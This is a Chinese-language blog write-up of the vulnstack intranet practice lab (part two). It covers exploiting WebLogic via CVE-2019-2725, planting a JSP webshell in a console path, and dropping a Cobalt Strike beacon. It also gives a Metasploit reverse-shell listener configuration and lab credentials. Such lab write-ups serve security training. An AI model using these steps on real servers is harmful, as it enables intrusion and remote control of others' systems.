---
title: vulnstack内网靶场(二)
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-10-16 16:32:04
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-876112.png
---
这次就不写保姆级教程了，太累了。
老实说这些靶场其实学不到什么技术，只是用来练习使用各种工具。
靶场链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/

## 环境搭建
网络拓扑图

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606213851.png)

网卡

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606213827.png)

kali：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214434.png)

WEB、PC：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214514.png)

DC：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214537.png)

若Web密码错误的，在快照管理器里面选择转到1.3即可。
手动开启Web服务，依次管理员执行账号为administrator，密码为1qaz@WSX。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214625.png)

打开web服务，需要管理员权限

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211015204358.png)

ping一下：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606214829.png)

搭建完成。

## 外网渗透

nmap收集一波信息，扫到了7001，实习的时候研究过weblogic，所以直接访问后台。

http://192.168.111.80:7001/console/login/LoginForm.jsp

WebLogic 10.3.6.0，康康工作时候的记录：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211015210034.png)

cve-2019-2725

先连接冰蝎，说到这不得不吐槽一下java，冰蝎和burp的java环境要求不一样导致要换来换去。

所以改用现成工具：https://kfi.re/220.html

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016145917.png)

weblogic上传木马路径选择：https://www.cnblogs.com/sstfy/p/10350915.html

\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016151233.png)

访问 http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/shell.jsp

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016151656.png)

## 拿到CS的shell

利用冰蝎上传cs马

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016161107.png)

虽然开了360，但是似乎并没有拦到我。
看到网上很多文章都是被拦截和绕过的，懒得整了

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016161325.png)

用cs自带的提权直接成功

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016162544.png)

接下来用cs给msf派生一个shell。

## 派生一个msf的shell（非必要）

这一步不是必须的，毕竟cs更适合打windows，只是记录一下技巧。

1、msf配置监听

	msf > use exploit/multi/handler 
	msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
	msf exploit(handler) > set lhost 192.168.135.128
	msf exploit(handler) > set lport 9999
	msf exploit(handler) > exploit

然后cs创建个新的监听器

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016193448.png)

右键想要派生的shell，点击spawn，选择刚刚创建的listener即可。但是我这里试了几次都没出的来，可能是环境问题。

问题不大，反正这里知道怎么派生即可。

## 内网渗透

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211016194629.png)

看了看后面的操作和一差不多，就不搞了。有空看看。

https://www.i4k.xyz/article/weixin_45605352/119898843



